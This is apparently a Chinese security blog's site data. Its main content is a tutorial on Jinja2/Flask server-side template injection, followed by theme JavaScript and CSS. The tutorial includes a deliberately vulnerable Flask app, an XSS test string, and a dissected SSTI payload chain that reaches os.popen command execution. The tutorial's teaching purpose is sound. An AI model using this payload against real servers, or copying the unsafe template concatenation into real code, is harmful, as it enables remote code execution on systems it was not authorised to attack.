render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home(): html = &quot;&quot;&quot;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;hello, &#123;&#123;name&#125;&#125;!&lt;br&gt;welcome to &#123;&#123;address&#125;&#125;!&lt;/body&gt;&lt;/html&gt; &quot;&quot;&quot; name = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot; address = &quot;().__class__&quot; rendered = render_template_string(html,name=name,address=address) return renderedif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 直接运行之后，打开浏览器，发现并没有将两个攻击解析。 那么一般这个漏洞是出现在什么地方呢？其实这个漏洞和Jinja2本身无关，大多数时候就是程序员粗心大意造成的。因为后面需要渲染的参数其实是可以省略的，有的程序员会在前面直接将需要渲染的参数和模板源代码进行拼接，最后就传递一个模板源代码的字符串给渲染函数，这个时候就会出现漏洞。 举一个例子： 123456789101112131415161718192021222324252627282930from flask import Flask, render_template, render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def home(): html = &quot;&quot;&quot;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;hello, &#123;0&#125;!&lt;br&gt;welcome to &#123;1&#125;!&lt;/body&gt;&lt;/html&gt; &quot;&quot;&quot; name = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot; address = &quot;&#123;&#123;().__class__&#125;&#125;&quot; html = html.format(name, address) print(html) rendered = render_template_string(html) return renderedif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 这个时候，我们运行而且打开浏览器，就会收到弹窗，而且看到 12hello, !welcome to &lt;class &#x27;tuple&#x27;&gt;! 这个时候，我们发现两个攻击都被解析了。这是因为Jinja2中的安全处理是针对我们后面传进去的需要渲染的参数，并不会对模板源代码中的内容再进行检查，因为没有经过处理，所以他们一个被浏览器正常解析，一个被Jinja2根据语法正常解析，最终导致出现漏洞。 而使用render_template_string这个函数需要我们手写模板源代码，就比较容易出现这样的错误。所以以后我们只需要看代码中是否将我们输入的内容先和模板源代码进行拼接再进行渲染，一但出现这个，就说明存在ssti注入，无论是使用哪一个模板渲染函数都是一样的。所以我们在开发中需要格外注意这一点。 当然，在真实的开发环境中，有的时候我们就是需要先将用户的输入和我们的模板源代码进行拼接，再进行渲染解析，以实现复杂的业务逻辑或者特定功能。这个时候我们就需要做好严格的过滤和限制。 Jinja2中的模板环境什么是模板环境？模板环境是 Jinja2 的核心概念，用于管理模板的全局变量、过滤器、测试和其他配置。模板环境决定了哪些全局变量和函数可以在模板中使用，并提供了模板渲染的上下文。默认情况下，Jinja2 的模板环境不包含所有的 Python 内置函数，只包含一些常用的全局变量和函数。 我们来看一个例子： 12345678from jinja2 import Templatetemplate = Template(&quot;&quot;&quot;&#123;&#123;type(123)&#125;&#125;&quot;&quot;&quot;)print(type(123))print(template.render()) 运行之后，第一个输出&lt;class ‘int’&gt;，第二个报错jinja2.exceptions.UndefinedError: ‘type’ is undefined。 type是python中内置的函数，我们是可以直接使用的，第一个输出也验证过了是没有问题的。但是在使用Jinja2模板引擎进行解析时，却出现了报错 type is undefined，这就是因为Jinja2中的模板环境中没有包含type函数的定义。 在 Jinja2 中，模板环境是通过 Environment 类来定义的。模板渲染时，Template 类会使用一个 Environment 实例来管理模板的渲染过程。实际上，Template 类是所有渲染函数的底层，因此使用任何渲染函数时，都会受到同一个模板环境的影响，也就是说，所有的模板共享同一个环境。 所以 type is undefined 这个报错是由于模板环境导致的，有些人会以为是Jinja2中的沙箱机制导致的，实质上启用沙箱环境，需要手动使用 jinja2.sandbox.SandboxedEnvironment 类来创建模板环境才行，这个类继承的就是Environment类。 默认的模板环境Jinja2 的模板环境包含许多配置，如全局变量、过滤器和测试函数。全局变量是可以直接在模板中访问的变量；过滤器是函数，使用时需要通过管道符 | 调用，因此不能通过过滤器访问 __globals__ 属性；测试函数用于条件判断，使用时需要通过 is 关键字。 我们分别来举一个例子： 12345678&#123;&#123;joiner&#125;&#125; //输出&lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;，这里joiner就是一个全局变量&#123;&#123;&quot;haha&quot; | length&#125;&#125; //输出4，这里length就是一个过滤器&#123;% if 4 is even %&#125;4 is even&#123;% else %&#125;4 is not even&#123;% endif %&#125;// 输出even，这里even就是一个测试函数 我们来看一下默认的全局变量有哪些？是定义在Jinja2的default.py中。 一共有6个，其中前两个是python中的内置类，是使用c语言写的，我们不能通过他们来获取对应的__globals__属性；后面四个，第一个是一个函数，后面三个是一个类，都是在Jinja2的utils.py中定义的，是使用python写的，我们可以通过他们来获取对应的__globals__属性。 然后还有过滤器和测试函数，因为这两个有点多，所以这里不再张贴出来，他们分别是在Jinja2中的filters.py和tests.py。 在针对ssti的过滤中，我们经常借助全局变量和过滤器来进行绕过。但是我们这里不详细讲解这些配置的作用，因为显得太啰嗦。在后面讲解ssti绕过的文章中，我们会讲解几个经典的借助过滤器和全局变量来进行绕过的利用。 flask中的上下文环境Flask 中的 上下文环境（Context）是指在请求处理过程中，Flask 提供的一种机制，用于在不同的部分（如视图函数、模板、全局对象等）间共享和访问请求和应用的相关数据。它包括请求上下文和应用上下文。 请求上下文 request：包含当前 HTTP 请求的所有信息，例如请求方法、路径、数据（表单、JSON 等）、头部信息、cookies 等。 session：用于存储与当前会话相关的信息。session 是一个类似字典的对象，常用于存储用户登录状态、用户偏好等会话数据。 g：一个全局对象，可以用于在请求期间存储临时数据（如用户身份信息、数据库连接等）。g 的数据只在当前请求上下文内有效。 url_for()：生成应用中指定视图函数的 URL。它可以动态构建路由的 URL 地址。 get_flashed_messages()： 是 Flask 用来显示闪存消息的函数。闪存消息可以用于传递一次性的信息，如提示、警告等。 应用上下文 current_app：当前 Flask 应用实例，用于访问应用配置和全局信息。 config ：是 Flask 应用的配置对象，包含应用的所有配置信息 g：用于存储应用级别的共享数据。 这里只是列举了几个而已，但是这里列举的几个都是可以直接在模版中访问使用的（除了current_app，看有的资料说可以，但是测试了一下不行），就像模版空间中的全局变量一样，这也是我们为什么要在这里提他。 在进行ssti注入的时候，我们可以借助他们来构造payload，其中的request和session我们还可以借助他们来进行绕过。这里先提前了解一下。 注意，这里我们需要将他们和Jinja2中的模板环境中的全局变量区分开来，模板环境中的全局变量是可以直接在Jinja2中使用，但是应用上下文中的全局变量需要flask来进行注入（这个过程是自动的，不需要我们操作）之后才能进行使用。 之所以要提供这样的上下文环境，一方面肯定是为了数据共享，另一方面也是为了线程安全，这种方法也简化了程序员对一些基础性代码的重复书写，更加关注业务逻辑本身的实现。这些了解即可。 Jinja2中的两种语法结构1234&#123;&#123;&#125;&#125;用于输出变量的值或表达式的结果。&#123;%%&#125;用于执行控制结构，如条件判断、循环、宏定义等。它不会直接输出内容，而是用于控制模板的逻辑和流程。 ssti中使用到的魔术属性和魔术方法前置知识我们先来看一个经典的ssti注入语句。 12345().__class__.__base__.__subclasses__()[412].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()//注意，如果要使用这个payload进行本地测试的话，这里需要找到重写了__init__魔术方法的类的对应索引//我这里412这个索引对应的类就重写了__init__方法，关于这点后面会进行讲解 这个payload很绕，应该说ssti的payload都是绕的，就是因为我们前面提到的模板环境。整个模板环境中就定义了6个全局变量，我们要想使用对应的函数执行系统命令，就需要先找到对应的函数的定义。 魔术属性： 1234__class__ //返回对象所属的类__base__ //返回对象直接继承的父类，如果有多个，按照继承的顺序返回第一个__globals__ //返回函数定义时的全局命名空间，也就是返回函数所在py文件的全局变量，返回的是一个字典类型__builtins__ //返回python中的内置模块，返回的是一个字典类型 魔术方法： 12__subclasses__() //返回一个类所有直接继承该类的子类__init__() //创建对象实例时进行初始化，可以类比php中的__construct方法 一些细节： python中有一个object类，在python中定义一个类的时候，如果没有指定继承哪一个类，那么默认继承的就是object类。所以相当于python中的所有类都会继承object这个类，只不过有的是直接的，有的是间接的。 object类中定义了python中的一些基础的魔术方法，因为继承的关系，所有的类中都含有这些魔术方法，我们可以在类中将这些魔术方法进行重写。 python中其实函数和方法是两种定义，像我前面讲到的那些函数，实际上都是方法。方法是定义在类中，我们要通过类去调用，而函数独立在类外，我们可以直接调用。但是我们都可以通过他们去访问__globals__属性。这个时候我们其实使用的是方法或者函数的引用，你可以理解为c语言中的指针。所以在我们的payload中__init__魔术方法后面是没有加上括号的，加上了括号就代表着去执行这个方法而不是引用。 object类中的魔术方法是由c语言进行实现的，我们查看这些魔术方法的类型，会发现是&lt;class &#39;wrapper_descriptor&#39;&gt;；我们前面说了，__globals__属性代表的是函数定义时的全局命名空间，但是因为object类的魔术方法的具体实现不是在py文件中，这个时候去借助魔术方法访问__globals__属性就会报错AttributeError: &#39;wrapper_descriptor&#39; object has no attribute &#39;__globals__&#39;。 当我们在类中重写魔术方法，这个时候的魔术方法就是由python语言实现的，魔术方法的类型就会变成&lt;class &#39;function&#39;&gt;，我们就可以借助魔术方法访问__globals__属性。因为__init__这个魔术方法会在创建对象实例时进行初始化，所以一般类中都会重写这个魔术方法，这也就是为什么很多payload都是使用了__init__。但是我们要知道使用其他方法也是可以的。 python中的数据容器本身都是一个类，而且我们可以分别使用各种符号去直接创建对应数据容器的实例对象，上面的()代表的就是一个元组的实例对象，只不过这个元组为空，没有储存任何数据。 payload解析12345678910().__class__ //获取这个实例对象的所属类，也就是元组 &lt;class &#x27;tuple&#x27;&gt;().__class__.__base__ //元组没有指定继承类，所以是直接继承object，这里就会返回&lt;class &#x27;object&#x27;&gt;().__class__.__base__.__subclasses__() //返回所有直接继承object的子类().__class__.__base__.__subclasses__()[412] //找到重写了__init__方法的子类__init__.__globals__.__builtins__ //获取python中的内置模块__import__(&#x27;os&#x27;) //通过内置模块中的内置方法__import__导入模块os，os中含有可以执行系统命令的popen//到这一步我们就完成了前面说的想要在模板环境中使用对应的函数，就要找到对应函数的定义popen(&#x27;whoami&#x27;).read() //执行系统命令，因为返回的结果包装成一个文件对象，所以要调read()来获取结果 小结在一开始写这一篇文章的时候，我本来还想着介绍一下python中的数据容器，因为ssti手注出现错误时一般和这里有关，还有我们的一些绕过也和他有关。但是想着这里毕竟不是重点，再加上内容较为基础，就不再写了。 其实这篇文章讲得还是比较浅，很多东西只是点到为止，像root_render_func这个函数的python代码到底是怎么生成的以及Jinja2中的沙箱机制的实现等，因为本人也不是很了解，所以没有进行深入。不过从了解和入门ssti注入漏洞这个角度来看，这篇文章是够了。 事后补充说明函数是可以直接访问__builtins__属性的，在写绕过时才发现的。因为文章本身懒得改了，所以在这里说明一下。其实影响也不大。 过了几天在本地服务器上面进行ssti注入的时候，发现这个时候函数不能直接访问__builtins__属性。对比了一下两个地方的flask版本，能够直接访问的flask版本是3.0.3，不能够直接访问的flask版本是2.0.3。虽然两个地方的python版本也不一样，但是我测试了一下，在不使用flask框架的情况下面，两者中的函数都不能直接访问__builtins__属性，所以应该是flask版本问题。建议平时还是通过__globals__属性来访问__builtins__属性。","tags":["基础知识"],"categories":["python","ssti"]},{"title":"友链","path":"/friends/index.html","content":"暂无。"},{"title":"更多","path":"/more/index.html","content":"暂无更多其他信息，只是单纯觉得导航栏放4个比较好看。"},{"title":"About","path":"/about/index.html","content":"一名普普通通的信息安全专业在读学生，主页是学习，副业是摸鱼。 本博客主要是分享一些web安全方面的知识，以及一些ctf比赛的wp。 有事可以通过github联系，在导航栏左下角（不过不一定来得及回复）。"},{"path":"/assets/js/main.js","content":"// utils const util = { // https://github.com/jerryc127/hexo-theme-butterfly diffDate: (d, more = false) => { const dateNow = new Date() const datePost = new Date(d) const dateDiff = dateNow.getTime() - datePost.getTime() const minute = 1000 * 60 const hour = minute * 60 const day = hour * 24 let result if (more) { const dayCount = dateDiff / day const hourCount = dateDiff / hour const minuteCount = dateDiff / minute if (dayCount > 14) { result = null } else if (dayCount >= 1) { result = parseInt(dayCount) + ' ' + ctx.date_suffix.day } else if (hourCount >= 1) { result = parseInt(hourCount) + ' ' + ctx.date_suffix.hour } else if (minuteCount >= 1) { result = parseInt(minuteCount) + ' ' + ctx.date_suffix.min } else { result = ctx.date_suffix.just } } else { result = parseInt(dateDiff / day) } return result }, copy: (id, msg) => { const el = document.getElementById(id); if (el) { el.select(); document.execCommand(\"Copy\"); if (msg && msg.length > 0) { hud.toast(msg, 2500); } } }, toggle: (id) => { const el = document.getElementById(id); if (el) { el.classList.toggle(\"display\"); } }, scrollTop: () => { window.scrollTo({top: 0, behavior: \"smooth\"}); }, scrollComment: () => { document.getElementById('comments').scrollIntoView({behavior: \"smooth\"}); }, viewportLazyload: (target, func, enabled = true) => { if (!enabled || !(\"IntersectionObserver\" in window)) { func(); return; } const observer = new IntersectionObserver((entries) => { if (entries[0].intersectionRatio > 0) { func(); observer.disconnect(); } }); observer.observe(target); } } const hud = { toast: (msg, duration) => { const d = Number(isNaN(duration) ? 2000 : duration); var el = document.createElement('div'); el.classList.add('toast'); el.classList.add('show'); el.innerHTML = msg; document.body.appendChild(el); setTimeout(function(){ document.body.removeChild(el) }, d); }, } // defines const l_body = document.querySelector('.l_body'); const init = { toc: () => { utils.jq(() => { const scrollOffset = 32; var segs = []; $(\"article.md-text :header\").each(function (idx, node) { segs.push(node); }); function activeTOC() { var scrollTop = $(this).scrollTop(); var topSeg = null; for (var idx in segs) { var seg = $(segs[idx]); if (seg.offset().top > scrollTop + scrollOffset) { continue; } if (!topSeg) { topSeg = seg; } else if (seg.offset().top >= topSeg.offset().top) { topSeg = seg; } } if (topSeg) { $(\"#data-toc a.toc-link\").removeClass(\"active\"); var link = \"#\" + topSeg.attr(\"id\"); if (link != '#undefined') { const highlightItem = $('#data-toc a.toc-link[href=\"' + encodeURI(link) + '\"]'); if (highlightItem.length > 0) { highlightItem.addClass(\"active\"); } } else { $('#data-toc a.toc-link:first').addClass(\"active\"); } } } function scrollTOC() { const e0 = document.querySelector('#data-toc .toc'); const e1 = document.querySelector('#data-toc .toc a.toc-link.active'); if (e0 == null || e1 == null) { return; } const offsetBottom = e1.getBoundingClientRect().bottom - e0.getBoundingClientRect().bottom + 100; const offsetTop = e1.getBoundingClientRect().top - e0.getBoundingClientRect().top - 64; if (offsetTop < 0) { e0.scrollBy({top: offsetTop, behavior: \"smooth\"}); } else if (offsetBottom > 0) { e0.scrollBy({top: offsetBottom, behavior: \"smooth\"}); } } var timeout = null; window.addEventListener('scroll', function() { activeTOC(); if(timeout !== null) clearTimeout(timeout); timeout = setTimeout(function() { scrollTOC(); }.bind(this), 50); }); }) }, sidebar: () => { utils.jq(() => { $(\"#data-toc a.toc-link\").click(function (e) { sidebar.dismiss(); }); }) }, relativeDate: (selector) => { selector.forEach(item => { const $this = item const timeVal = $this.getAttribute('datetime') let relativeValue = util.diffDate(timeVal, true) if (relativeValue) { $this.innerText = relativeValue } }) }, /** * Tabs tag listener (without twitter bootstrap). */ registerTabsTag: function () { // Binding `nav-tabs` & `tab-content` by real time permalink changing. document.querySelectorAll('.tabs .nav-tabs .tab').forEach(element => { element.addEventListener('click', event => { event.preventDefault(); // Prevent selected tab to select again. if (element.classList.contains('active')) return; // Add & Remove active class on `nav-tabs` & `tab-content`. [...element.parentNode.children].forEach(target => { target.classList.toggle('active', target === element); }); // https://stackoverflow.com/questions/20306204/using-queryselector-with-ids-that-are-numbers const tActive = document.getElementById(element.querySelector('a').getAttribute('href').replace('#', '')); [...tActive.parentNode.children].forEach(target => { target.classList.toggle('active', target === tActive); }); // Trigger event tActive.dispatchEvent(new Event('tabs:click', { bubbles: true })); }); }); window.dispatchEvent(new Event('tabs:register')); }, } // init init.toc() init.sidebar() init.relativeDate(document.querySelectorAll('#post-meta time')) init.registerTabsTag()"},{"path":"/assets/js/plugins/copycode.js","content":"window.codeElements.forEach((codeElement) => { // 创建复制按钮 const codeCopyBtn = document.createElement('div'); codeCopyBtn.className = 'copy-btn'; codeCopyBtn.textContent = ctx.copycode.default_text; codeElement.appendChild(codeCopyBtn); // 添加点击事件监听 codeCopyBtn.addEventListener('click', async () => { const codeToCopy = codeElement.querySelector('pre')?.innerText || ''; if (navigator.clipboard) { try { await navigator.clipboard.writeText(codeToCopy); codeCopyBtn.textContent = ctx.copycode.success_text; codeCopyBtn.classList.add('success'); hud.toast(ctx.copycode.toast, 2500); } catch (error) { codeCopyBtn.textContent = '未获得用户许可'; codeCopyBtn.classList.add('warning'); } } else { codeCopyBtn.textContent = '浏览器不支持/非HTTPS'; codeCopyBtn.classList.add('warning'); } // 3秒后恢复默认文本 setTimeout(() => { codeCopyBtn.textContent = ctx.copycode.default_text; codeCopyBtn.classList.remove('success', 'warning'); }, 3000); }); });"},{"path":"/assets/js/search/local-search.js","content":"// A local search script with the help of // [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search) // Copyright (C) 2015 // Joseph Pan // Shuhao Mao // This library is free software; you can redistribute it and/or modify // it under the terms of the GNU Lesser General Public License as // published by the Free Software Foundation; either version 2.1 of the // License, or (at your option) any later version. // // This library is distributed in the hope that it will be useful, but // WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU // Lesser General Public License for more details. // // You should have received a copy of the GNU Lesser General Public // License along with this library; if not, write to the Free Software // Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA // 02110-1301 USA // // Modified by: // Pieter Robberechts /*exported searchFunc*/ var searchFunc = function(path, filter, wrapperId, searchId, contentId) { function getAllCombinations(keywords) { var i, j, result = []; for (i = 0; i < keywords.length; i++) { for (j = i + 1; j < keywords.length + 1; j++) { result.push(keywords.slice(i, j).join(\" \")); } } return result; } $.ajax({ url: path, dataType: \"json\", success: function(jsonResponse) { var datas = jsonResponse; var $input = document.getElementById(searchId); if (!$input) { return; } var $resultContent = document.getElementById(contentId); var $wrapper = document.getElementById(wrapperId); $input.addEventListener(\"input\", function(){ var resultList = []; var keywords = getAllCombinations(this.value.trim().toLowerCase().split(\" \")) .sort(function(a,b) { return b.split(\" \").length - a.split(\" \").length; }); $resultContent.innerHTML = \"\"; if (this.value.trim().length = 0 || indexContent >= 0 ){ matches += 1; if (indexContent < 0) { indexContent = 0; } if (firstOccur < 0) { firstOccur = indexContent; } } }); } // show search results if (matches > 0) { var searchResult = {}; searchResult.rank = matches; searchResult.str = \"\"+ dataTitle +\"\"; if (firstOccur >= 0) { // cut out 100 characters var start = firstOccur - 20; var end = firstOccur + 80; if(start < 0){ start = 0; } if(start == 0){ end = 100; } if(end > dataContent.length){ end = dataContent.length; } var matchContent = dataContent.substring(start, end); // highlight all keywords var regS = new RegExp(keywords.join(\"|\"), \"gi\"); matchContent = matchContent.replace(regS, function(keyword) { return \"\"+keyword+\"\"; }); searchResult.str += \"\" + matchContent +\"...\"; } searchResult.str += \"\"; resultList.push(searchResult); } }); if (resultList.length) { resultList.sort(function(a, b) { return b.rank - a.rank; }); var result =\"\"; for (var i = 0; i < resultList.length; i++) { result += resultList[i].str; } result += \"\"; $resultContent.innerHTML = result; } }); } }); }; utils.jq(() => { var $inputArea = $(\"input#search-input\"); if ($inputArea.length == 0) { return; } var $resultArea = document.querySelector(\"div#search-result\"); $inputArea.focus(function() { var path = ctx.search.path; if (path.startsWith('/')) { path = path.substring(1); } path = ctx.root + path; const filter = $inputArea.attr('data-filter') || ''; searchFunc(path, filter, 'search-wrapper', 'search-input', 'search-result'); }); $inputArea.keydown(function(e) { if (e.which == 13) { e.preventDefault(); } }); var observer = new MutationObserver(function(mutationsList, observer) { if (mutationsList.length == 1) { if (mutationsList[0].addedNodes.length) { $('.search-wrapper').removeClass('noresult'); } else if (mutationsList[0].removedNodes.length) { $('.search-wrapper').addClass('noresult'); } } }); observer.observe($resultArea, { childList: true }); });"},{"path":"/assets/js/search/algolia-search.js","content":"utils.jq(() => { var $inputArea = $(\"input#search-input\"); if ($inputArea.length === 0) { return; } var $resultArea = $(\"#search-result\"); var $searchWrapper = $(\"#search-wrapper\"); var client = algoliasearch(window.searchConfig.appId, window.searchConfig.apiKey); var index = client.initIndex(window.searchConfig.indexName); function filterResults(hits, filterPath) { if (!filterPath || filterPath === '/') return hits; var regex = new RegExp(filterPath); return hits.filter(hit => regex.test(hit.url)); } function displayResults(hits) { var $resultList = $(\"\").addClass(\"search-result-list\"); if (hits.length === 0) { $searchWrapper.addClass('noresult'); } else { $searchWrapper.removeClass('noresult'); hits.forEach(function(hit) { var contentSnippet = hit._snippetResult.content.value; var title = hit.hierarchy.lvl1 || 'Untitled'; var $item = $(\"\").html(`${title}${contentSnippet}`); $resultList.append($item); }); } $resultArea.html($resultList); } $inputArea.on(\"input\", function() { var query = $(this).val().trim(); var filterPath = $inputArea.data('filter'); if (query.length"},{"path":"/assets/js/services/friends.js","content":"utils.jq(() => { $(function () { const els = document.getElementsByClassName('ds-friends'); for (var i = 0; i < els.length; i++) { const el = els[i]; const api = el.getAttribute('api'); if (api == null) { continue; } const default_avatar = def.avatar; // layout utils.request(el, api, function(data) { for (let item of (data.content || data)) { var cell = ``; cell += ``;; cell += ``; cell += ``; cell += `${item.title || item.login}`; cell += ``; cell += ``; cell += ``; $(el).find('.grid-box').append(cell); } }); } }); });"},{"path":"/assets/css/main.css","content":":root { --width-main: 720px; --fsp: 17px; --fsh2: calc(var(--fsp) + 11px); --fsh3: calc(var(--fsp) + 7px); --fsh4: calc(var(--fsp) + 4px); --side-content-width: 224px; --gap-margin: 16px; --gap-padding: 16px; --gap-p: calc(17px + 4px); --gap-p-compact: calc(17px * 0.75); } @media screen and (min-width: 2048px) { :root { --width-main: 780px; } } @media screen and (min-width: 2560px) { :root { --width-main: 860px; } } @media screen and (max-width: 768px) { :root { --side-content-width: 188px; } } @media screen and (max-width: 667px) { :root { --side-content-width: 224px; } } :root { --gap-max: calc(var(--gap-margin) + var(--gap-padding)); } .l_body.story { --gap-p: 2rem; } .l_body.story div.tag-plugin, .l_body.story p>img { margin-top: 2.4rem; margin-bottom: 2.4rem; } :root { --theme-link: #2094f3; } :root[data-theme=\"light\"] { --site-bg: #f9fafb; --card: #fff; --block: #f1f2f3; --block-border: #e3e5e8; --block-hover: #e9eaec; --theme-link-opa: rgba(32,148,243,0.2); --leftbar-bg: #e3e5e8; --alpha20: rgba(255,255,255,0.2); --alpha50: rgba(255,255,255,0.5); --alpha60: rgba(255,255,255,0.6); --alpha75: rgba(255,255,255,0.75); --alpha100: #fff; --text: #000; --text-p1: #333; --text-p2: #4d4d4d; --text-p3: #808080; --text-p4: #999; --text-meta: #ccc; --text-code: #14181f; } :root[data-theme=\"dark\"] { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --theme-link-opa: rgba(32,148,243,0.4); --leftbar-bg: #383d42; --alpha20: rgba(0,0,0,0.2); --alpha50: rgba(0,0,0,0.5); --alpha60: rgba(0,0,0,0.6); --alpha75: rgba(0,0,0,0.75); --alpha100: #000; --text: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #fff; } @media screen and (max-width: 667px) { :root[data-theme=\"dark\"] { --site-bg: #000; } } :root:not([data-theme]) { --site-bg: #f9fafb; --card: #fff; --block: #f1f2f3; --block-border: #e3e5e8; --block-hover: #e9eaec; --theme-link-opa: rgba(32,148,243,0.2); --leftbar-bg: #e3e5e8; --alpha20: rgba(255,255,255,0.2); --alpha50: rgba(255,255,255,0.5); --alpha60: rgba(255,255,255,0.6); --alpha75: rgba(255,255,255,0.75); --alpha100: #fff; --text: #000; --text-p1: #333; --text-p2: #4d4d4d; --text-p3: #808080; --text-p4: #999; --text-meta: #ccc; --text-code: #14181f; } @media (prefers-color-scheme: dark) { :root:not([data-theme]) { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --theme-link-opa: rgba(32,148,243,0.4); --leftbar-bg: #383d42; --alpha20: rgba(0,0,0,0.2); --alpha50: rgba(0,0,0,0.5); --alpha60: rgba(0,0,0,0.6); --alpha75: rgba(0,0,0,0.75); --alpha100: #000; --text: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #fff; } } @media screen and (prefers-color-scheme: dark) and (max-width: 667px) { :root:not([data-theme]) { --site-bg: #000; } } pre { font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-size: 0.8125rem; tab-size: 4; -moz-tab-size: 4; -o-tab-size: 4; -webkit-tab-size: 4; } a { text-decoration: none; color: var(--theme-link); } a:hover { color: #ff5724; } .md-text p:not([class]) { text-align: left; } hr { color: var(--text-meta); opacity: 0.1; } img { max-width: 100%; } li { font-size: calc(var(--fsp) - 1px); } ul, ol { padding-left: 1.5rem; } table:not([class]) { border-collapse: collapse; overflow: auto; display: block; margin: 1rem 0; max-width: 100%; vertical-align: text-top; --fsp: calc(17px - 2px); font-size: var(--fsp); } table:not([class]) th { background: var(--block); } table:not([class]) td, table:not([class]) th { padding: 0.5em 1em; border: 1px solid var(--block-hover); line-height: 1.5; } table:not([class]) tr { word-break: keep-all; white-space: nowrap; } table:not([class]) tr:hover { background: var(--block); } *[ff=title] { font-family: system-ui, \"Microsoft Yahei\", \"Segoe UI\", -apple-system, Roboto, Ubuntu, \"Helvetica Neue\", Arial, \"WenQuanYi Micro Hei\", sans-serif; } blockquote { display: block; margin-left: 0; margin-right: 0; padding: 0.25rem 0.75rem; background: var(--block); border-left: 4px solid var(--text-meta); border-radius: 4px 12px 12px 4px; color: var(--text-p2); } :root { --blur-px: 12px; --blur-bg: var(--alpha50); } .blur { background: var(--blur-bg); } @supports ((-webkit-backdrop-filter: blur(var(--blur-px))) or (backdrop-filter: blur(var(--blur-px)))) { .blur { background: var(--blur-bg) !important; backdrop-filter: saturate(200%) blur(var(--blur-px)); -webkit-backdrop-filter: saturate(200%) blur(var(--blur-px)); } } .blur:hover { background: var(--card); } button { border: none; font-weight: 500; outline: none; -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; cursor: pointer; } a.button { font-weight: 500; line-height: 1; padding: 0.75rem 2rem; border-radius: 4px; font-size: 0.9375rem; user-select: none; } a.button.theme { background: #1cd0fd; color: var(--card); } a.button.theme:hover { background: #ff5724; } a.button.start { border-radius: 100px; background: var(--text-p1); color: var(--card); } a[onclick]:hover { cursor: pointer; } a.button.start.gradient { position: relative; } :root[data-theme=\"dark\"] a.button.start.gradient { transition: 0.38s ease-out; z-index: 0; background: linear-gradient(to right, #4c95fa, #38c9fa, #24f9c4, #24f9c4, #38c9fa, #4c95fa); background-size: 1000%; color: #fff; text-shadow: 0 0 1px rgba(0,0,0,0.12); animation: glow 60s linear infinite; } :root[data-theme=\"dark\"] a.button.start.gradient:after { content: ''; position: absolute; left: 0; right: 0; top: 0; bottom: 0; border-radius: 100px; background: inherit; z-index: -1; filter: blur(12px); opacity: 0.5; transition: 0.38s ease-out; } :root[data-theme=\"dark\"] a.button.start.gradient:hover:after { filter: blur(36px); opacity: 1; } @-moz-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-webkit-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-o-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @media (prefers-color-scheme: dark) { :root:not([data-theme]) a.button.start.gradient { transition: 0.38s ease-out; z-index: 0; background: linear-gradient(to right, #4c95fa, #38c9fa, #24f9c4, #24f9c4, #38c9fa, #4c95fa); background-size: 1000%; color: #fff; text-shadow: 0 0 1px rgba(0,0,0,0.12); animation: glow 60s linear infinite; } :root:not([data-theme]) a.button.start.gradient:after { content: ''; position: absolute; left: 0; right: 0; top: 0; bottom: 0; border-radius: 100px; background: inherit; z-index: -1; filter: blur(12px); opacity: 0.5; transition: 0.38s ease-out; } :root:not([data-theme]) a.button.start.gradient:hover:after { filter: blur(36px); opacity: 1; } @-moz-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-webkit-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @-o-keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } @keyframes glow { from { background-position: 0%; } to { background-position: 1000%; } } } .cap { font-weight: 500; font-size: 0.8125rem; scrollbar-width: none; color: var(--text-p2); } .cap.blue { color: #0d87e9; } .cap.cyan { color: #03c3f5; } .cap.theme { color: #03cafc; } .dis-select { -moz-user-select: none; -ms-user-select: none; -webkit-user-select: none; user-select: none; } .mobile-only { display: none; } @media screen and (max-width: 667px) { .mobile-only { display: block !important; } } @media screen and (max-width: 667px) { .mobile-hidden { display: none !important; } } .float-panel { position: sticky; grid-column-end: span 3; right: 0; bottom: 2rem; float: right; z-index: 10; display: flex; flex-direction: column; border-radius: 8px; margin-left: auto; margin-right: 1rem; overflow: hidden; --blur-px: 16px; --blur-bg: rgba(255,255,255,0.4); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } @media screen and (min-width: 667px) { .float-panel { margin-right: 2rem; } } :root[data-theme=\"dark\"] .float-panel { --blur-bg: rgba(0,0,0,0.4); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .float-panel { --blur-bg: rgba(0,0,0,0.4); } } .float-panel button { cursor: pointer; color: var(--text); background: none; padding: 8px; line-height: 0; font-size: 28px; margin: 0; display: flex; } .float-panel button >* { width: auto; height: 28px; } .float-panel button >* path#sep { transition: transform 0.2s 